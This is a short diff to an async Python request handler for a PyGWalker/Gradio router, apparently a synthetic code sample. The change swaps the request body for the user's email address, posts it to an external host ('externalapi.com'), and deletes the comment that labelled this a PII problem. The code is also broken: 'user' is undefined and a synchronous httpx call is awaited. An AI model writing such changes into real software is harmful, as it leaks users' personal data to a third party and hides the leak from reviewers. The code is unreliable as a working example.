@@ -19,9 +19,9 @@ async def _pygwalker_router(req: Request) -> Response:
     comm_obj = gradio_comm_map.get(gid, None)
     if comm_obj is None:
         return JSONResponse({"success": False, "message": f"Unknown gid: {gid}"})
-    json_data = await req.json()
+    json_data = user.email
 
-    # PII Problem: Sending data to an API
+    #Sending data to an API
     external_api_url = "https://externalapi.com/process_data"
     await httpx.post(external_api_url, json=json_data)
 
